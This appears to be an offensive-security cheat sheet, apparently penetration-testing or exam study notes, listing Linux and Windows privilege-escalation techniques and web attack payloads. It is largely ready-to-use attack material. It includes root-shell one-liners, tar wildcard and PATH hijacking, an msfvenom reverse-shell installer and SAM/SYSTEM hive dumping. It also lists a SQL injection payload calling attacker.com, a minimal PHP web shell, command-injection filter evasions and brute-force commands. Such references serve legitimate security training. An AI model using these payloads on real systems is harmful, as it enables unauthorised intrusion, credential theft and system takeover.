# ADDENDUM 06: Privilege Escalation & Web Apps — Advanced

## Linux PrivEsc — Capabilities
```bash
getcap -r / 2>/dev/null
# Common abuses:
# cap_setuid+ep on python → python -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_dac_read_search+ep → read any file
# cap_net_raw+ep → packet capture
```

## Linux PrivEsc — Wildcard Injection
```bash
# If crontab runs: tar cf /backup/archive.tar /home/*
# Create malicious files:
touch /home/--checkpoint=1
touch /home/--checkpoint-action=exec=shell.sh
# When tar runs, it executes shell.sh as root
```

## Linux PrivEsc — PATH Hijacking
```bash
# If script calls command without full path:
echo '/bin/bash' > /tmp/command
chmod +x /tmp/command
export PATH=/tmp:$PATH
# When script runs 'command', it executes your bash
```

## Linux PrivEsc — NFS Root Squashing
```bash
showmount -e TARGET
# If no_root_squash:
mount -t nfs TARGET:/share /mnt
# Create SUID binary on share, execute on target as root
```

## Linux PrivEsc — Automated Tools
```bash
./linpeas.sh -a              # All checks
./lse.sh -l 2                # Linux Smart Enumeration, level 2
./pspy64                     # Monitor processes without root
```

## Windows PrivEsc — Token Impersonation
```cmd
whoami /priv
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
# → Potato exploits (JuicyPotato, RoguePotato, SweetPotato, PrintSpoofer)
PrintSpoofer.exe -i -c cmd.exe
```

## Windows PrivEsc — AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f msi > evil.msi
msiexec /q /i evil.msi
```

## Windows PrivEsc — SeBackupOperator / SeRestoreOperator
```cmd
# SeBackupOperator: read any file including SAM/SYSTEM
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM

# SeRestoreOperator: write to any file → replace binary → persistence
```

## Windows PrivEsc — Automated Tools
| Tool | Command | Description |
|------|---------|-------------|
| **winPEAS** | `winPEASx64.exe` | Windows Privilege Escalation Awesome Script |
| **PowerUp** | `Invoke-AllChecks` | PowerShell privilege escalation enumeration |
| **SharpUp** | `SharpUp.exe audit` | C# PrivEsc checker |
| **PrivescCheck** | `Invoke-PrivescCheck` | PowerShell PrivEsc enumeration |

## XSS Subtypes
| Type | Description | Example |
|------|-------------|---------|
| **Reflected** | Payload in URL, reflected in response | `<script>alert(1)</script>` in search param |
| **Stored** | Payload saved to DB, served to all users | Malicious comment on blog |
| **DOM-based** | Payload processed client-side in DOM | `document.location` manipulation |
| **CSP Bypass** | Defeating Content Security Policy | Using allowed CDN with JSONP |

## SQLi Subtypes
| Type | Description | Detection |
|------|-------------|-----------|
| **UNION-based** | Extract data via UNION SELECT | `' UNION SELECT NULL,NULL-- -` |
| **Boolean-based** | True/false inference | `' AND 1=1-- -` vs `' AND 1=2-- -` |
| **Time-based** | Response time inference | `'; WAITFOR DELAY '0:0:5'-- -` |
| **Error-based** | Error messages reveal data | `' AND (SELECT 1 FROM dual)-- -` |
| **Out-of-band** | Data via DNS/HTTP | `'; EXEC master..xp_dirtree '\\attacker.com\'-- -` |

## File Upload Bypasses
| Filter | Bypass |
|--------|--------|
| **Extension blacklist** | `.pHp`, `.php5`, `.phtml`, `.PHP`, double ext (`shell.php.jpg`), null byte (`shell.php%00.jpg`) |
| **MIME type check** | Change Content-Type to `image/gif` via Burp |
| **Magic bytes** | Add GIF header: `GIF89a;` before PHP code |
| **Size check** | Minimal shell: `<?=\`$_GET[c]\`?>` |

## Command Injection Bypasses
| Filter | Bypass |
|--------|--------|
| **Space blocked** | `${IFS}`, `%09` (Tab), `{cmd,argument}` |
| **Slash blocked** | `${PATH:0:1}`, `$(echo L2V0Yy9wYXNzd2Q= \| base64 -d)` |
| **Blacklist** | `w'h'o'am'i`, `$(rev<<<'imaohw')`, `$(printf '\167\150\157\141\155\151')` |
| **Pipe blocked** | `;`, `&&`, `\|\|`, `|`, `` `cmd` `` |
| **Length limit** | `>` redirect to build command incrementally |

## Login Brute Forcing
```bash
# Hydra
hydra -l admin -P wordlist.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# ffuf
ffuf -u http://target/login -X POST -d "username=admin&password=FUZZ" -w wordlist.txt -mc 200 -fr "Invalid"

# Burp Intruder: Capture login → Send to Intruder → Snipe mode → Load wordlist → Start
```

## ffuf Advanced Usage
```bash
# Recursive
ffuf -u http://target/FUZZ -w wordlist -recursion -recursion-depth 3

# Auto-tuning
ffuf -u http://target/FUZZ -w wordlist -ac

# Filter by size/words/lines/status
ffuf -u http://target/FUZZ -w wordlist -fs 1234 -fw 56 -fl 10 -fc 403,404

# Rate limiting
ffuf -u http://target/FUZZ -w wordlist -rate 100

# Headers
ffuf -u http://target/FUZZ -w wordlist -H "Authorization: Bearer TOKEN"

# Extensions
ffuf -u http://target/FUZZ -w wordlist -e .php,.txt,.js,.bak

# Match status codes
ffuf -u http://target/FUZZ -w wordlist -mc 200,204,301,302,307
```

## Burp Suite / Web Proxy Usage
| Tool | Purpose |
|------|---------|
| **Intercept** | Toggle on/off, modify requests in transit |
| **Repeater** | Manual request manipulation |
| **Intruder** | Automated attacks (sniper, battering ram, pitchfork, cluster bomb) |
| **Scanner** | Auto vuln detection (Pro only) |
| **Comparer** | Compare responses |
| **Decoder** | Encode/decode data |
| **Collaborator** | OOB interaction detection (Pro only) |
| **Match/Replace** | Modify requests automatically |
| **Extensions** | BApp Store for additional functionality |

## Burp Content-Type Bypass for File Upload
1. Intercept upload POST request
2. Change `Content-Type: application/x-php` → `image/gif`
3. Or change extension in filename parameter
4. Forward request
